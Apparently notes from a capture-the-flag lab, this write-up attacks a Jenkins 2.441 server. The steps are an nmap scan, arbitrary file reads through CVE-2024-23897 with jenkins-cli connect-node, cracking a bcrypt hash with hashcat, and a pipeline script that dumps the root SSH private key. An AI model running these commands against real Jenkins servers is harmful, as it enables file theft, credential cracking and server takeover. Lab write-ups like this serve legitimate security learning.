**TARGET:** `10.10.11.10`
**MY IP:**  `10.10.14.23`

# NMAP

```nmap-tcp
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 18:13 CST
Nmap scan report for 10.10.11.10
Host is up (0.0092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# PORT 8080

Found Jenkins running over http
Jetty version 10.0.18
Jenkins version 2.441

Found a user with User ID:
`jennifer`

Found that [CVE-2024-23897](https://www.errno.fr/bruteforcing_CVE-2024-23897.html) works
This article, the [security advisory](https://www.jenkins.io/security/advisory/2024-01-24/) and [exploit](https://github.com/xaitax/CVE-2024-23897) shows that using the connect-node command allows for full file reads instead of only first 3 lines

This is because the CLI treats @xyz where xyz is a file path as "read the file" in for arguments to the command

Connect-node appears to take each line independently as a command and the error messages then print out each line leading to arbitrary file read

Doing this allowed read of the config.xml and the users/users.xml

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://10.10.11.10:8080/ connect-node @/var/jenkins_home/users/users.xml
```

Which showed that the config for jennifer user from above is stored in a folder which I then read as well:

```
 java -jar jenkins-cli.jar -noCertificateCheck -s http://10.10.11.10:8080/ connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

This gave a hash for the user's password which hashcat and the rockyou worldlist worked for:

```
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```

Hashcat:

```
hashcat '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' -m 3200 /usr/share/wordlists/rockyou.txt 
```

With this cracked hash, logged in as jennifer to Jenkins instance

As jennifer, able to create a new pipeline which can read any global secret including the credential stored as id: '1' aka the root SSH key

So made this pipeline based on [dumping jenkins secrets](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) and ran it leading to a dump of the SSH Key:

```
pipeline {
  agent any
  stages {

    stage('sshUserPrivateKey') {
      steps {
        script {
          withCredentials([
            sshUserPrivateKey(
              credentialsId: '1',
              keyFileVariable: 'keyFile',
              passphraseVariable: 'passphrase',
              usernameVariable: 'username')
          ]) {
            print 'keyFile=' + keyFile
            print 'keyFile.collect { it }=' + keyFile.collect { it }
            print 'keyFileContent=' + readFile(keyFile)
          }
        }
      }
    }

  }
}
```

